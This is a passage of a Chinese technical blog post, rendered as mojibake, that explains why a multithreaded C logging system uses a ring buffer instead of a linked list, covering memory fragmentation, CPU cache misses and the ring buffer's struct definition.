<p>æ‰¹é‡å†™å…¥ï¼šè¿™é‡Œè¦å…ˆæä¸€å˜´ï¼Œæœ¬é¡¹ç›®æ¼”ç¤ºçš„æ˜¯åŸºç¡€å¼‚æ­¥å†™å…¥ï¼Œæ²¡æœ‰é‡‡ç”¨æ‰¹é‡å†™å…¥ã€‚å¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­é…åˆ<strong>æ‰¹é‡å†™å…¥</strong>ï¼ˆæ”’å¤Ÿ 4KB å†è½ç›˜ï¼‰ï¼Œæ€§èƒ½è¿˜èƒ½è¿›ä¸€æ­¥å‹æ¦¨ï¼Œè¿™ä¹Ÿæ˜¯ 300 å€å·®è·çš„æ¥æºä¹‹ä¸€ã€‚æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªå·±å®ç°ä¸€ä¸‹æ‰¹é‡å†™å…¥ï¼Œçœ‹çœ‹æ€§èƒ½å·®è·ç›¸æ¯”æ¯æ¡æ—¥å¿—å†™ä¸€æ¬¡æœ‰å¤šå¤§ã€‚åœ¨è¿›é˜¶ä¼˜åŒ–ä¸­ï¼Œæ¶ˆè´¹è€…å¯ä»¥<strong>ä¸€æ¬¡ç§¯æ”’ 4KB æ•°æ®å†ä¸€æ¬¡æ€§å†™å…¥ç£ç›˜</strong>ï¼Œè¿›ä¸€æ­¥å‡å°‘ç³»ç»Ÿè°ƒç”¨æ¬¡æ•°ï¼Œå»¶é•¿ Flash å¯¿å‘½ã€‚</p>
<h2 data-id="heading-6">3. æ•°æ®ç»“æ„é€‰å‹ï¼šä¸ºä½•æŠ›å¼ƒé“¾è¡¨ï¼Ÿ</h2>
<p>åœ¨è®¾è®¡æ—¥å¿—ç¼“å†²åŒºçš„å­˜å‚¨ç»“æ„æ—¶ï¼Œæœ‰ä¸¤ç§æ•°æ®ç»“æ„å¯ä»¥ä¾›æˆ‘ä»¬æŒ‘é€‰ï¼š</p>
<ol start="0">
<li>é“¾è¡¨ï¼šåŠ¨æ€å¢é•¿ï¼Œç†è®ºä¸Šæ— é™å¤§ã€‚</li>
<li>ç¯å½¢ç¼“å†²åŒºï¼šåŸºäºå®šé•¿æ•°ç»„ï¼Œå¾ªç¯ä½¿ç”¨ã€‚</li>
</ol>
<p>åˆå­¦è€…å¾€å¾€<strong>å–œæ¬¢ç”¨é“¾è¡¨</strong>ï¼Œå› ä¸ºç®€å•ä¸”ä¸éœ€è¦è€ƒè™‘å†…å­˜å æ»¡çš„æƒ…å†µã€‚ä½†åœ¨<strong>é«˜æ€§èƒ½ã€é«˜å¹¶å‘ã€é•¿æœŸè¿è¡Œ</strong>çš„åµŒå…¥å¼/æœåŠ¡ç«¯åœºæ™¯ä¸‹ï¼Œé“¾è¡¨æœ‰ç€è‡´å‘½çš„ç¼ºé™·ã€‚</p>
<h3 data-id="heading-7">3.1 é“¾è¡¨çš„ä¸‰å¤§ç¼ºé™·</h3>
<p>æ—¥å¿—ç³»ç»Ÿä¸€èˆ¬æ˜¯è¦é•¿æœŸè¿è¡Œçš„ï¼Œé‡‡ç”¨é“¾è¡¨çš„æ—¥å¿—ç³»ç»Ÿåœ¨å‹æµ‹å’Œé•¿æœŸè¿è¡Œä¸‹é€šå¸¸ä¼šæš´éœ²ä¸‹é¢å‡ ä¸ªé—®é¢˜ï¼š</p>
<h4 data-id="heading-8">3.1.1 å†…å­˜ç¢ç‰‡åŒ–</h4>
<p>æ¯å½“æœ‰æ–°æ—¥å¿—äº§ç”Ÿï¼Œéƒ½éœ€è¦è°ƒç”¨ <code>malloc</code> åˆ†é…ä¸€ä¸ªå°èŠ‚ç‚¹ï¼Œæ¶ˆè´¹åè°ƒç”¨ freeé‡Šæ”¾å†…å­˜ã€‚ä½†åœ¨é«˜é¢‘æ—¥å¿—åœºæ™¯ä¸‹ï¼ˆå¦‚æ¯ç§’ 1000 æ¬¡ï¼‰ï¼Œé¢‘ç¹çš„ç”³è¯·é‡Šæ”¾ä¼šå°†<strong>å †å†…å­˜ç¢ç‰‡åŒ–</strong>ã€‚åœ¨åµŒå…¥å¼è®¾å¤‡é•¿æœŸè¿è¡Œçš„æ¡ä»¶ä¸‹ï¼ˆ7x24å°æ—¶ï¼‰ï¼Œææ˜“å¯¼è‡´ <strong>OOM (Out Of Memory)</strong> ï¼Œå³ä½¿å‰©ä½™æ€»å†…å­˜è¶³å¤Ÿï¼Œå´ç”³è¯·ä¸åˆ°è¿ç»­çš„å¤§å—å†…å­˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42b3db74a455461f8156b444220e271e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=LPRsoj83ibKJ4lrLyNu%2FMqrMRzs%3D" alt="ç‘å£«å¥¶é…ª.png" loading="lazy"/></p>
<p>è¿™å¼ å›¾ç‰‡åº”è¯¥æ˜¯æ¯”è¾ƒå½¢è±¡çš„ï¼Œå¤§å®¶çœ‹åˆ°è¿™å¼ å›¾ç‰‡åº”è¯¥èƒ½å¤Ÿæ˜ç™½å†…å­˜ç¢ç‰‡åŒ–å¤§æ¦‚æ˜¯ä»€ä¹ˆæ„æ€äº†ã€‚</p>
<h4 data-id="heading-9">3.1.2 å†…å­˜åˆ†é…çš„æ€§èƒ½å¼€é”€</h4>
<p><code>malloc</code> å’Œ <code>free</code> å¹¶ä¸æ˜¯ç®€å•çš„ C è¯­å¥ï¼Œå®ƒä»¬æ˜¯<strong>ç³»ç»Ÿåº“å‡½æ•°</strong>ã€‚å®ƒä»¬å†…éƒ¨ç»´æŠ¤ç€å¤æ‚çš„å†…å­˜é“¾è¡¨ï¼Œå¹¶ä¸”ä¸ºäº†<strong>çº¿ç¨‹å®‰å…¨</strong>ï¼Œmalloc å†…éƒ¨é€šå¸¸ä¹Ÿæœ‰<strong>é”</strong>ã€‚</p>
<p>å¹¶ä¸”åœ¨å†…å­˜ç¢ç‰‡åŒ–åï¼Œ<code>malloc</code>è°ƒç”¨äº§ç”Ÿçš„<strong>å¼€é”€ä¼šè¶Šæ¥è¶Šå¤§</strong>ï¼Œå› ä¸ºå†…å­˜ä¸Šçš„å­”æ´è¶Šæ¥è¶Šå¤šï¼Œè¿™ä½¿å¾—å¯»æ‰¾ä¸€å—åˆé€‚å¤§å°çš„å†…å­˜è¶Šæ¥è¶Šå›°éš¾ã€‚é«˜é¢‘è°ƒç”¨ <code>malloc</code> æœ¬èº«å°±ä¼šæ¶ˆè€—å¤§é‡çš„ CPU æ—¶é—´ï¼Œè¿™å·²ç»è¿èƒŒäº†æˆ‘ä»¬æé€Ÿå†™å…¥çš„åˆè¡·ã€‚</p>
<h4 data-id="heading-10">3.1.3 CPU ç¼“å­˜å¯¹é“¾è¡¨ä¸å‹å¥½</h4>
<p>æœ‰æœ‹å‹å°±æƒ³é—®äº†ï¼šâ€œä¸ºä»€ä¹ˆCPUç¼“å­˜å¯¹é“¾è¡¨ä¸å‹å¥½å‘¢ï¼Ÿéš¾é“å®ƒå¯¹æ•°ç»„å°±å¾ˆå‹å¥½å—ï¼Ÿâ€ã€‚æ˜¯çš„ï¼Œä»–å¯¹æ•°ç»„ç¡®å®å‹å¥½ï¼Œä½†è¿™å¹¶ä¸æ˜¯å®ƒæ­§è§†é“¾è¡¨ï¼Œè€Œæ˜¯ç”±CPUæœ¬èº«çš„ç‰¹æ€§å†³å®šçš„ã€‚</p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæ•°ç»„çš„å†…å­˜æ˜¯è¿ç»­çš„ï¼Œè€Œé“¾è¡¨çš„èŠ‚ç‚¹åœ¨å †å†…å­˜ä¸­åˆ†æ•£åˆ†å¸ƒç€ï¼Œéå†é“¾è¡¨éœ€è¦éšæœºè·³è·ƒè®¿é—®å†…å­˜ï¼Œå¯¼è‡´ <strong>Cache Missï¼ˆç¼“å­˜æœªå‘½ä¸­ï¼‰</strong> ç‡æé«˜ï¼Œä¸¥é‡æ‹–æ…¢ CPU æ•ˆç‡ã€‚</p>
<p>å¹¶ä¸”CPUè¯»å–å†…å­˜æ—¶ï¼Œä¼šåˆ©ç”¨ <strong>ç©ºé—´å±€éƒ¨æ€§</strong> å°†ç›¸é‚»çš„æ•°æ®é¢„å–åˆ° <strong>L1/L2 Cache</strong> ä¸­ï¼Œå› æ­¤æ•°ç»„å°±å æ®äº†å¤©ç„¶çš„ä¼˜åŠ¿ã€‚</p>
<p>è¿™é‡Œæœ‰å¿…è¦æ‹“å±•ä¸€ä¸‹ <strong>Cache Miss</strong> ï¼Œç”¨ä¸€å¥é€šä¿—ç‚¹çš„è¯æ¥è®²ï¼šç°ä»£ CPU æ€§èƒ½çš„æå¤§ç¨‹åº¦ä¸Šå–å†³äºæ•°æ®ç¦»æ ¸å¿ƒæœ‰å¤šè¿‘ï¼Œè€Œ <strong>Cache Miss</strong> æ­£æ˜¯ç”±äºè¦è®¿é—®çš„æ•°æ®å¤ªè¿œæ‰€å¯¼è‡´çš„ã€‚</p>
<p>ä¸‹é¢è¦èŠçš„æ˜¯è®¡ç®—æœºä½“ç³»ç»“æ„ä¸­æ¯”è¾ƒç»å…¸çš„å†…å®¹ï¼Œå¯èƒ½ä¼šæ¯”è¾ƒæ¯ç‡¥ï¼Œä½†æˆ‘ä¼šå°½åŠ›æŠŠå®ƒæè¿°çš„å½¢è±¡ä¸€ç‚¹ï¼š</p>
<h5 data-id="heading-11">3.1.3.1 Cacheçš„å±‚çº§ç»“æ„</h5>
<p>é€šå¸¸æˆ‘ä»¬è¯´L1ï¼ŒL2ï¼ŒL3ä¸‰å±‚ç¼“å­˜ã€‚</p>
<p><strong>L1 Cacheï¼ˆä¸€çº§ç¼“å­˜ï¼‰</strong> ï¼šç¦» CPU æ ¸å¿ƒæœ€è¿‘ï¼Œå°±åœ¨æ ¸å¿ƒå†…éƒ¨ã€‚é€Ÿåº¦æœ€å¿«ï¼Œä½†å†…å­˜æœ€å°ï¼Œå¤§å°ä¸º32æˆ–64KBï¼Œé€Ÿåº¦çº¦<strong>1çº³ç§’</strong>ã€‚</p>
<p><strong>L2 Cacheï¼ˆäºŒçº§ç¼“å­˜ï¼‰</strong> ï¼šç¨å¾®è¿œä¸€ç‚¹ï¼Œ<strong>é€šå¸¸</strong>ä¹Ÿæ˜¯æ¯ä¸ªæ ¸å¿ƒç‹¬äº«ã€‚æ¯” L1 æ…¢ä¸€ç‚¹ï¼Œä½†å†…å­˜æ›´å¤§ï¼Œ256KB æˆ– 512KBã€‚é€Ÿåº¦çº¦ <strong>3-10 çº³ç§’</strong>ã€‚</p>
<p><strong>L3 Cacheï¼ˆä¸‰çº§ç¼“å­˜ï¼‰</strong> ï¼šæ‰€æœ‰ CPU æ ¸å¿ƒ<strong>å…±äº«</strong>çš„ã€‚æ›´å¤§ï¼Œä½†æ›´æ…¢ï¼Œå‡  MB åˆ°å‡ å MBï¼Œé€Ÿåº¦çº¦ <strong>10-20 çº³ç§’</strong>ã€‚</p>
<p><strong>å†…å­˜</strong>ï¼šä¸»æ¿ä¸Šçš„å†…å­˜æ¡ã€‚å·¨å¤§ä½†ææ…¢ï¼Œé€Ÿåº¦çº¦ <strong>60-100 çº³ç§’</strong>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fac7d7927354f9395727ac8483640c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=XoES%2BtXzfjuhuFYRxitnylI6ITE%3D" alt="ä¸‰å±‚ç¼“å­˜.png" loading="lazy"/></p>
<p>è¿™å¼ å›¾æ˜¯æˆ‘ç”µè„‘çš„é…ç½®ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ˜¯16æ ¸çš„ã€‚L1ç¼“å­˜ä¸º1MBï¼Œå¹³æ‘Šåˆ°æ¯ä¸ªæ ¸ä¸Šé¢å°±æ˜¯64KB/æ ¸ã€‚L2ç¼“å­˜å¹³æ‘Šåˆ°æ¯ä¸ªæ ¸ä¸Šé¢æ˜¯1MB/æ ¸ã€‚L3ç¼“å­˜çš„64MBæ˜¯æ‰€æœ‰16ä¸ªæ ¸å¿ƒå…±äº«çš„ã€‚</p>
<p>è¿™ä¸ªé…ç½®çœ‹èµ·æ¥æ¯”ä¸Šé¢ä»‹ç»çš„å‚æ•°è¦å¤§ä¸€ç‚¹ï¼ˆå®é™…ä¸Šå¤§å·®ä¸å·®ï¼‰ï¼Œä½†æ˜¯åšåµŒå…¥å¼å¼€å‘æ—¶ï¼Œé¢å¯¹çš„æ¿å­å¯èƒ½æ ¹æœ¬å°±æ²¡æœ‰L2å’ŒL3ç¼“å­˜ã€‚<strong>Cache Miss</strong> çš„ä»£ä»·ä¼šç›´æ¥ååº”åœ¨è®¾å¤‡å¡é¡¿ä¸Šã€‚</p>
<h5 data-id="heading-12">3.1.3.2 ä»€ä¹ˆæ˜¯ Cache Miss</h5>
<p>å…ˆä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯ <strong>Cache Lineï¼ˆç¼“å­˜è¡Œï¼‰</strong> ï¼Œå¦‚æœCPUè¦è®¿é—®ä¸€ä¸ªå­—èŠ‚ï¼Œç³»ç»Ÿä¸ä¼šåªç»™å®ƒè¿™ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªå­—èŠ‚æ‰€åœ¨çš„ <strong>Cache Line</strong> å…¨éƒ¨ç»™å®ƒï¼Œè¿™ä¸ª <strong>Cache Line</strong> é€šå¸¸æ˜¯<strong>64å­—èŠ‚</strong>ã€‚è¿™æ„å‘³ç€ï¼Œå½“è¯»å–å†…å­˜åœ°å€ 0x1000 æ—¶ï¼ŒCPU ä¼šè‡ªåŠ¨æŠŠ 0x1000 åˆ° 0x103F çš„ 64 å­—èŠ‚å…¨éƒ¨åŠ è½½åˆ° Cache ä¸­ã€‚</p>
<p><strong>æ¯ä¸€æ¬¡æŸ¥æ‰¾å¤±è´¥ï¼Œéƒ½å«ä¸€æ¬¡ Missã€‚</strong></p>
<p>å½“CPUè¦è¯»å–ä¸€ä¸ªå˜é‡æ—¶ï¼Œå®ƒä¼šå…ˆæŸ¥L1ï¼Œå¦‚æœL1å‘½ä¸­å°±ç›´æ¥ä½¿ç”¨ï¼Œè€—æ—¶1nsã€‚å¦‚æœL1æœªå‘½ä¸­å°±æŸ¥L2ã€‚</p>
<p>å¦‚æœL2å‘½ä¸­ï¼ŒæŠŠæ•°æ®æ¬åˆ°L1å†ç»™CPUï¼Œè€—æ—¶5nsã€‚å¦‚æœL2æœªå‘½ä¸­å°±æŸ¥L3ã€‚</p>
<p>å¦‚æœL3å‘½ä¸­ï¼ŒæŠŠæ•°æ®æ¬åˆ°L2ï¼Œå†æ¬åˆ°L1å†ç»™CPUï¼Œè€—æ—¶15nsã€‚å¦‚æœL3ä¹ŸæŸ¥ä¸åˆ°ï¼Œé‚£å°±æ‚²å‰§äº†ã€‚</p>
<p>æ­¤æ—¶ï¼ŒCPUåªèƒ½æŒ‚èµ·ç­‰å¾…ï¼Œè®©å†…å­˜æ§åˆ¶å™¨å»RAMé‡Œé¢æ‰¾è¿™ä¸€ç­‰å¯èƒ½å°±æ˜¯ä¸Šç™¾çº³ç§’ã€‚å¯¹äº 2GHz çš„ CPU æ¥è¯´ï¼Œ100ns æ„å‘³ç€å®ƒå¯ä»¥ç©ºè½¬ <strong>200 ä¸ªå‘¨æœŸ</strong>ã€‚è¿™æ®µæ—¶é—´ CPU ä»€ä¹ˆéƒ½å¹²ä¸äº†ï¼Œçº¯æµªè´¹ã€‚</p>
<p>å¯¹äºæ•°ç»„ï¼šæ•°ç»„åœ¨å†…å­˜é‡Œæ˜¯<strong>è¿ç»­å­˜æ”¾</strong>çš„ã€‚å½“CPUè¦è®¿é—®<strong>æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ </strong>ï¼Œå¤§æ¦‚ç‡æ˜¯ä¸åœ¨ä¸‰å±‚ç¼“å­˜çš„ï¼Œä»–å¯èƒ½è¦ç­‰å¾ˆä¹…æ•°æ®æ‰èƒ½è¢«æ‹¿è¿‡æ¥ï¼Œé€Ÿåº¦å½“ç„¶å°±æ¯”è¾ƒæ…¢äº†ï¼Œè¿™å« <strong>Cache Miss</strong> ã€‚ä½†å®ƒæ‹¿å›æ¥çš„æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ æ‰€åœ¨çš„ <strong>Cache Line</strong> ï¼Œå…±64ä¸ªå­—èŠ‚ã€‚å½“ä»–å¤„ç†å®Œç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè¦å¤„ç†ç¬¬äºŒä¸ªæ—¶ï¼Œå“ï¼Œå®ƒå‘ç°ç¬¬äºŒä¸ªå…ƒç´ å°±åœ¨ä»–æ‰‹è¾¹ï¼Œå®ƒå¯ä»¥å¾ˆå¿«çš„å¤„ç†å®Œç¬¬äºŒä¸ªå…ƒç´ ï¼Œè¿™å« <strong>Cache Hitï¼ˆç¼“å­˜å‘½ä¸­ï¼‰</strong> ã€‚å¹¶ä¸”åé¢å®ƒè¦å¤„ç†çš„å…ƒç´ å¯èƒ½å…¨éƒ½åœ¨å®ƒæ‰‹è¾¹ï¼Œä¹Ÿå°±æ˜¯è¯´åé¢å¯èƒ½å…¨éƒ¨ <strong>Cache Hit</strong> ï¼Œè¿™æ ·æ•ˆç‡æ˜¯æé«˜çš„ã€‚</p>
<p>å¯¹äºé“¾è¡¨ï¼šé“¾è¡¨çš„ç»“ç‚¹æ˜¯<code>malloc</code>å‡ºæ¥çš„ï¼Œåœ¨å †å†…å­˜é‡Œé¢çš„åˆ†å¸ƒæ˜¯æ²¡æœ‰è§„çŸ©å¯è¨€çš„ã€‚è¿™æ—¶CPUè¦è®¿é—®æ¯ä¸€ä¸ªç»“ç‚¹ï¼Œè€Œè¿™äº›ç»“ç‚¹å­˜åœ¨äºä¸‰å±‚ç¼“å­˜çš„æ¦‚ç‡å¾ˆå°ï¼Œå¹¶ä¸”é“¾è¡¨æ²¡æœ‰åƒæ•°ç»„é‚£æ ·ï¼Œä¸€æ¬¡è®¿é—®æ…¢ä½†å¯¹åé¢å¤šæ¬¡è®¿é—®æ•ˆç‡æå‡å…·æœ‰ä¿ƒè¿›ä½œç”¨çš„æœºåˆ¶ã€‚å› æ­¤ï¼Œå¦‚æœä½¿ç”¨é“¾è¡¨ï¼Œ<strong>Cache Miss</strong> çš„æ¦‚ç‡æé«˜ã€‚</p>
<h5 data-id="heading-13">3.1.3.3 ä¸€ç‚¹å°è¡¥å……</h5>
<p>åœ¨é«˜ç«¯åµŒå…¥å¼ SoCï¼ˆå¦‚æ ‘è“æ´¾ã€æ‰‹æœº Cortex-Aï¼‰ä¸­ï¼Œé€šå¸¸æœ‰ L1/L2/L3 ä¸‰çº§ç¼“å­˜ã€‚ä½†åœ¨ä½ç«¯å•ç‰‡æœºï¼ˆå¦‚ STM32 Cortex-M3/M4ï¼‰ä¸­ï¼Œé€šå¸¸<strong>æ²¡æœ‰ Cache</strong> æˆ–è€…åªæœ‰ç®€å•çš„ <strong>æŒ‡ä»¤/æ•°æ®ç¼“å­˜</strong>ã€‚ å°½ç®¡å¦‚æ­¤ï¼Œ<strong>RAM çš„çªå‘è¯»å–ï¼ˆBurst Readï¼‰</strong> ç‰¹æ€§ä¾ç„¶ä½¿å¾—é¡ºåºè®¿é—®ï¼ˆæ•°ç»„ï¼‰æ¯”éšæœºè®¿é—®ï¼ˆé“¾è¡¨ï¼‰å¿«å¾—å¤šã€‚</p>
<p>ç°ä»£ RAM çš„ Burst Read ç‰¹æ€§è®©é¡ºåºè¯»å†™ 64 å­—èŠ‚å’Œéšæœºè¯» 1 å­—èŠ‚çš„ç¡¬ä»¶æˆæœ¬å‡ ä¹ä¸€æ ·ã€‚ é…åˆ CPU ç¡¬ä»¶é¢„å–å™¨å’Œå¤šçº§ç¼“å­˜ï¼ŒçœŸæ­£è¿ç»­ã€64 å­—èŠ‚å¯¹é½çš„é¡ºåºè®¿é—®ï¼ˆRing Bufferï¼‰å¯ä»¥æ¯”éšæœºè·³è·ƒçš„é“¾è¡¨å¿« 10ï½50 å€ï¼Œè€Œä¸”è¿™ä¸æ˜¯è½¯ä»¶ä¼˜åŒ–ï¼Œæ˜¯ç‰©ç†åº•å±‚çš„ç¡¬åŠ é€Ÿï¼Œæ²¡å¾—é€‰ã€‚</p>
<p>æ‰€ä»¥ï¼š <strong>Ring Buffer å¿«ä¸æ˜¯å› ä¸ºä»£ç å†™å¾—å¥½ï¼Œè€Œæ˜¯å› ä¸ºå®ƒåƒåˆ°äº† CPU + Cache + DRAM ä¸‰è€…è”åˆçš„çº¢åˆ©</strong>ã€‚ é“¾è¡¨å†ä¼˜é›…ï¼Œä¹Ÿæ‰“ä¸è¿‡ç‰©ç†å®šå¾‹ã€‚</p>
<h3 data-id="heading-14">3.2 ç¯å½¢ç¼“å†²åŒºè®¾è®¡åŸç†</h3>
<p>ç¯å½¢ç¼“å†²åŒºæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª<strong>å›ºå®šå¤§å°çš„æ•°ç»„</strong>ï¼Œé€šè¿‡ç»´æŠ¤ <code>head</code>ï¼ˆè¯»æŒ‡é’ˆï¼‰å’Œ <code>tail</code>ï¼ˆå†™æŒ‡é’ˆï¼‰ä¸¤ä¸ªç´¢å¼•ï¼Œå’Œ<strong>å–æ¨¡è¿ç®—</strong>æ¥å®ç°é¦–å°¾ç›¸æ¥çš„å¾ªç¯çš„æ•ˆæœã€‚</p>
<p>ä¸‹é¢ä»‹ç»ä¸€ä¸‹å®ç°çš„æ ¸å¿ƒé€»è¾‘ï¼š</p>
<ol start="0">
<li>
<p>åˆå§‹åŒ–ï¼šç”³è¯·ä¸€å—å¤§å†…å­˜ï¼ˆä¾‹å¦‚ 1MBï¼‰ï¼Œè¿™æ˜¾ç„¶ä¸ä¼šé€ æˆå†…å­˜ç¢ç‰‡åŒ–ã€‚ç»™ <code>head</code> å’Œ <code>tail</code> èµ‹0 ã€‚</p>
</li>
<li>
<p>å†™å…¥ (Push)ï¼šæ•°æ®å­˜å…¥ <code>buffer[tail]</code>ï¼Œç„¶å <code>tail</code> å‘åç§»åŠ¨ã€‚</p>
<p>ç„¶å <code>tail = (tail + 1) % capacity</code></p>
</li>
<li>
<p>è¯»å– (Pop)ï¼šä» <code>buffer[head]</code> å–å‡ºæ•°æ®ï¼Œç„¶å <code>head</code> å‘åç§»åŠ¨ã€‚</p>
<p>ç„¶å <code>head = (head + 1) % capacity</code></p>
</li>
<li>
<p>åˆ¤æ–­æ˜¯å¦ç©ºæˆ–è€…æ»¡ï¼šé€šè¿‡ä¸€ä¸ª <code>count</code> è®¡æ•°å™¨ï¼Œæˆ–è€…é€šè¿‡ <code>head</code> å’Œ <code>tail</code> çš„ç›¸å¯¹ä½ç½®æ¥åˆ¤æ–­ã€‚</p>
</li>
</ol>
<p>åœ¨æœ¬é¡¹ç›®ä¸­ï¼Œä¸ºäº†ç®€åŒ–å¤šçº¿ç¨‹ä¸‹çš„çŠ¶æ€åˆ¤æ–­ï¼Œæˆ‘å¼•å…¥äº†ä¸€ä¸ª<code>count</code>è®¡æ•°å™¨é…åˆäº’æ–¥é”æ¥ç²¾ç¡®æ§åˆ¶ã€‚</p>
<p>å°çŸ¥è¯†ï¼šåœ¨æåº¦è¿½æ±‚æ€§èƒ½çš„åœºæ™¯ä¸‹ï¼ˆå¦‚ Linux å†…æ ¸ kfifoï¼‰ï¼Œé€šå¸¸ä¼šå°†ç¼“å†²åŒºå¤§å°è®¾ç½®ä¸º <strong>2 çš„å¹‚æ¬¡æ–¹</strong>ï¼ˆå¦‚ 1024, 4096ï¼‰ã€‚è¿™æ ·å¯ä»¥ç”¨ <strong>ä½è¿ç®— (&amp;)</strong> ä»£æ›¿ <strong>å–æ¨¡è¿ç®— (%)</strong> ï¼š</p>
<p>å–æ¨¡ï¼š<code>tail = (tail + 1) % 1024</code></p>
<p>å¯¹åº”çš„ä½è¿ç®—ï¼š<code>tail = (tail + 1) &amp; (1024 - 1)</code></p>
<h3 data-id="heading-15">3.3 æ ¸å¿ƒæ•°æ®ç»“æ„å®šä¹‰</h3>
<p>ä¸ºäº†å®ç°é€šç”¨æ€§ä¸å°è£…æ€§ï¼Œæˆ‘å®šä¹‰äº†ä¸‹é¢ç»“æ„ä½“ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å•æ¡æ—¥å¿—çš„æœ€å¤§é•¿åº¦</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG_MSG_SIZE 128</span>
â€‹
<span class="hljs-comment">// æ—¥å¿—</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> {
 Â  Â <span class="hljs-type">char</span> data[LOG_MSG_SIZE];
} Log;
â€‹
<span class="hljs-comment">// ç¯å½¢ç¼“å†²åŒºç®¡ç†</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> {
 Â  Â Log *entries; Â  Â  Â  Â  <span class="hljs-comment">// æŒ‡å‘ malloc çš„å¤§æ•°ç»„</span>
 Â  Â 
 Â  Â <span class="hljs-type">int</span> capacity; Â  Â  Â  Â  <span class="hljs-comment">// ç¼“å†²åŒºæ€»å®¹é‡</span>
 Â  Â <span class="hljs-type">int</span> count; Â  Â  Â  Â  Â  Â <span class="hljs-comment">// å½“å‰å·²å­˜å‚¨çš„æ—¥å¿—æ•°é‡</span>
 Â  Â 
 Â  Â <span class="hljs-type">int</span> head; Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// è¯»ç´¢å¼• (Consumer ç”¨)</span>
 Â  Â <span class="hljs-type">int</span> tail; Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// å†™ç´¢å¼• (Producer ç”¨)</span>
 Â  Â 
 Â  Â <span class="hljs-comment">// ç”¨äºä¼˜é›…é€€å‡º</span>
 Â  Â <span class="hljs-type">int</span> is_running; Â  Â  Â  <span class="hljs-comment">// 1: æ­£å¸¸è¿è¡Œ Â  0: åœæ­¢</span>
â€‹
 Â  Â <span class="hljs-comment">// çº¿ç¨‹åŒæ­¥å·¥å…·</span>
 Â  Â <span class="hljs-type">pthread_mutex_t</span> mutex;
 Â  Â <span class="hljs-type">pthread_cond_t</span> cond_producer; <span class="hljs-comment">// è‹¥ç¼“å†²åŒºæ»¡  ç”Ÿäº§è€…ç¡è§‰</span>
 Â  Â <span class="hljs-type">pthread_cond_t</span> cond_consumer; <span class="hljs-comment">// è‹¥ç¼“å†²åŒºç©º  æ¶ˆè´¹è€…ç¡è§‰</span>
 Â  Â 
 Â  Â <span class="hljs-comment">//å­˜æ”¾æ—¥å¿—å†…å®¹çš„æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span>
 Â  Â <span class="hljs-type">int</span> file_fd;
} RingBuffer;
</code></pre>
<p>è¿™ç§è®¾è®¡å³ä¿è¯äº†<strong>å†…å­˜çš„è¿ç»­æ€§</strong>ï¼Œåˆé€šè¿‡äº’æ–¥é”å’Œæ¡ä»¶å˜é‡ä¿è¯äº†<strong>çº¿ç¨‹å®‰å…¨</strong>ã€‚åœ¨ç¨‹åºå¯åŠ¨æ—¶ <code>rb_init</code> ä¸€æ¬¡æ€§åˆ†é…å†…å­˜ï¼Œè¿è¡Œè¿‡ç¨‹ä¸­å†æ— å†…å­˜ç”³è¯·æ“ä½œï¼Œæå…¶ç¨³å®šã€‚</p>
<p>è¿™é‡Œçš„æ–‡ä»¶æè¿°ç¬¦éœ€è¦å†æä¸€å˜´ï¼Œåˆå§‹åŒ–çš„æ—¶å€™æˆ‘ä¼šæŠŠå®ƒç½®ä¸º1ï¼Œä»£è¡¨<code>stdout</code>ï¼Œä¹Ÿå°±æ˜¯è¯´é»˜è®¤çš„æ—¥å¿—è¾“å‡ºä½ç½®æ˜¯ç»ˆç«¯ã€‚åé¢å¦‚æœè¦æ‰“å¼€æ–‡ä»¶æ—¶é‚£å°±ç»™ä»–å†æ¬¡èµ‹å€¼ã€‚å¦‚æœåªæ˜¯ç”¨æ¥æµ‹è¯•ï¼ŒæŸ¥çœ‹ç»ˆç«¯å†…å®¹ï¼Œå› è€Œä¸è¿›è¡Œå¯¹æ–‡ä»¶æè¿°ç¬¦é‡æ–°èµ‹å€¼çš„æ“ä½œï¼Œé‚£å°±è¦åœ¨<code>close</code>ä¹‹å‰è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ–‡ä»¶æè¿°ç¬¦çš„å€¼ä¸º1ï¼Œå°±ä¸è¿›è¡Œ<code>close</code>æ“ä½œã€‚ä½†æ˜¯ä¸ºäº†ä¿é™©èµ·è§ï¼Œæˆ‘å»ºè®®ä¸è®ºä¼šä¸ä¼šå¯¹æ–‡ä»¶æè¿°ç¬¦é‡æ–°èµ‹å€¼ï¼Œåœ¨å…³é—­æ–‡ä»¶æè¿°ç¬¦ä¹‹å‰éƒ½æ£€æŸ¥ä¸€ä¸‹å®ƒçš„å€¼ã€‚</p>
<h2 data-id="heading-16">4. æ ¸å¿ƒä»£ç å®ç°</h2>
